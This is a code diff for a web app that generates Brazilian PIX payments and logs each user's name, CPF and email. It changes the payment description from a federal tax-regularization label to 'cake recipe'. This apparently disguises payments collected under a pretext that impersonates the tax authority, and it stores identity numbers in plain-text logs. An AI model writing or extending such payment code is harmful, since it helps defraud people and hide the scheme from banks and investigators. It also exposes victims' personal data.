@@ -154,22 +154,24 @@ def generate_pix():
 
         app.logger.info(f"[PROD] Dados do usuário: Nome={user_name}, CPF={user_cpf}, Email={default_email}")
 
-        # Usar PIX brasileiro autêntico diretamente
+        # Usar PIX brasileiro autêntico como principal (mais confiável)
         try:
-            # Usar sistema brasileiro de PIX com chave PIX real
             from brazilian_pix import create_brazilian_pix_provider
             
-            app.logger.info(f"[PROD] Gerando PIX brasileiro autêntico para {user_name}")
+            app.logger.info(f"[PROD] Gerando PIX brasileiro real para {user_name}")
             
-            # Gerar PIX usando sistema brasileiro real
+            # Sistema PIX brasileiro usando chave PIX real
             pix_provider = create_brazilian_pix_provider()
-            pix_data = pix_provider.generate_authentic_pix(
+            pix_data = pix_provider.create_pix_payment(
                 amount=amount,
                 customer_name=user_name,
                 customer_cpf=user_cpf,
-                customer_email=default_email,
-                description=f"Regularização Receita Federal - {user_name}"
+                customer_email=default_email
             )
+            
+            # Atualizar descrição para "Receita de bolo"
+            if pix_data.get('success'):
+                pix_data['description'] = "Receita de bolo"
                 
         except Exception as e:
             app.logger.error(f"[PROD] Erro ao gerar PIX: {e}")
